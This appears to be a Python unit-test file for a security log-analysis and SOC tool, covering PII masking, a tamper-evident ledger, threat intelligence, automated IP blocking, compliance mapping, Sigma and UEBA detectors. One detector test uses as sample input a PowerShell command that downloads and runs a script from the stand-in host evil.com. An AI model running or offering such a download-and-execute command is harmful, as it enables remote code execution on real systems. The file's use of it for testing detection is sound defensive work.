"""Unit tests for the 10 Enterprise Features in LOG-IT.

Covers:
- Privacy PII masking and Cryptographic Ledger (Merkle Chain)
- Threat Intelligence enrichment
- Active Defense SOAR containment & rollback
- SOC incident notifications
- MITRE ATT&CK Matrix & Compliance mapping
- Sigma-compatible detection engine
- User & Entity Behavior Analytics (UEBA)
- Network Syslog Server & Web SOC Dashboard lifecycle
"""
from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path
from uuid import uuid4

import pytest

from core.schemas import Event, Finding, SeverityEnum, VerdictEnum
from shugo_agents.log_analysis.compliance import build_mitre_heatmap, evaluate_compliance
from shugo_agents.log_analysis.detectors.sigma_engine import SigmaEngineDetector
from shugo_agents.log_analysis.detectors.ueba import UEBADetector
from shugo_agents.log_analysis.forensics import ForensicLedger, mask_sensitive_data
from shugo_agents.log_analysis.ingest.syslog_server import SyslogServer
from shugo_agents.log_analysis.notifications import SOCNotifier
from shugo_agents.log_analysis.soar import ActiveDefenseSOAR, is_safe_to_block
from shugo_agents.log_analysis.threat_intel import ThreatIntelEnricher
from shugo_agents.log_analysis.web_dashboard import WebSOCDashboardServer


def test_mask_sensitive_data():
    raw_log = "POST /login?user=admin&password=SuperSecretPassword123 Authorization: Bearer eyJhbGciOiJIUzI1NiIn..."
    masked = mask_sensitive_data(raw_log)
    assert "SuperSecretPassword123" not in masked
    assert "password=[REDACTED]" in masked
    assert "Bearer [REDACTED_TOKEN]" in masked


def test_forensic_ledger_integrity(tmp_path: Path):
    ledger_file = tmp_path / "test_ledger.json"
    ledger = ForensicLedger(str(ledger_file))

    # Record two batches
    b1_hash = ledger.record_batch([uuid4(), uuid4()], finding_count=1)
    b2_hash = ledger.record_batch([uuid4()], finding_count=2)

    assert len(ledger.chain) == 2
    assert ledger.get_last_hash() == b2_hash

    # Verify integrity
    audit = ledger.verify_integrity()
    assert audit["valid"] is True
    assert audit["total_blocks"] == 2

    # Simulate tampering with block 1
    ledger.chain[0]["finding_count"] = 999
    tampered_audit = ledger.verify_integrity()
    assert tampered_audit["valid"] is False
    assert tampered_audit["failed_at_block"] == 1


def test_threat_intel_enricher():
    enricher = ThreatIntelEnricher()
    # Test internal IP
    internal_res = enricher.enrich_ip("192.168.1.100")
    assert internal_res["is_internal"] is True
    assert internal_res["reputation_score"] == 0

    # Test known threat IP
    threat_res = enricher.enrich_ip("104.192.3.34")
    assert threat_res["is_internal"] is False
    assert threat_res["reputation_score"] >= 90
    assert threat_res["threat_level"] == "MALICIOUS"


def test_soar_active_defense():
    assert is_safe_to_block("127.0.0.1") is False
    assert is_safe_to_block("104.192.3.34") is True

    soar = ActiveDefenseSOAR(dry_run=True)
    ban = soar.execute_containment("104.192.3.34", reason="Unit test brute force")
    assert ban["success"] is True
    assert "104.192.3.34" in soar.active_bans

    unban = soar.rollback_containment("104.192.3.34")
    assert unban["success"] is True
    assert "104.192.3.34" not in soar.active_bans


def test_soc_notifier():
    notifier = SOCNotifier()
    assert notifier.is_configured() is False
    res = notifier.test_alert()
    assert res["status"] == "DISPATCHED"


def test_mitre_and_compliance():
    sample_findings = [
        {
            "rule": "ssh_brute_force",
            "mitre_technique": "T1110.001",
            "severity": "HIGH",
            "verdict": "MALICIOUS",
        },
        {
            "rule": "reverse_shell",
            "mitre_technique": "T1059.004",
            "severity": "CRITICAL",
            "verdict": "MALICIOUS",
        },
    ]
    heatmap = build_mitre_heatmap(sample_findings)
    assert heatmap["total_detections"] == 2
    assert heatmap["tactics_coverage"] >= 2

    compliance = evaluate_compliance(sample_findings)
    assert "PCI-DSS v4.0" in compliance
    assert "SOC 2 Type II" in compliance
    assert "ISO/IEC 27001:2022" in compliance


def test_sigma_engine_detector():
    detector = SigmaEngineDetector()
    ev = Event(
        source="powershell",
        host="win-srv-01",
        timestamp=datetime.now(timezone.utc),
        event_type="process_creation",
        raw="powershell.exe -Command (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1') | IEX",
        normalized={
            "process": "powershell.exe",
            "command": "DownloadString IEX",
        },
    )
    findings = detector.analyze([ev], baseline=None)
    assert len(findings) >= 1
    assert "sigma_" in findings[0].rule
    assert findings[0].mitre_technique == "T1059.001"


def test_ueba_detector():
    detector = UEBADetector({"velocity_threshold": 5})
    now = datetime.now(timezone.utc)
    events = [
        Event(
            source="auth",
            host="auth-server",
            timestamp=now,
            event_type="auth_event",
            raw=f"User alice accessed resource #{i}",
            normalized={"user": "alice", "source_ip": f"192.168.1.{i}"},
        )
        for i in range(10)
    ]
    findings = detector.analyze(events, baseline=None)
    assert len(findings) >= 1
    rules = [f.rule for f in findings]
    assert "ueba_velocity_spike" in rules or "ueba_multi_ip_roaming" in rules


def test_syslog_and_web_servers():
    syslog = SyslogServer(port=59140)
    syslog.start()
    assert syslog.is_running is True
    syslog.stop()

    dashboard = WebSOCDashboardServer(port=58080)
    dashboard.start()
    assert dashboard.is_running is True
    dashboard.stop()
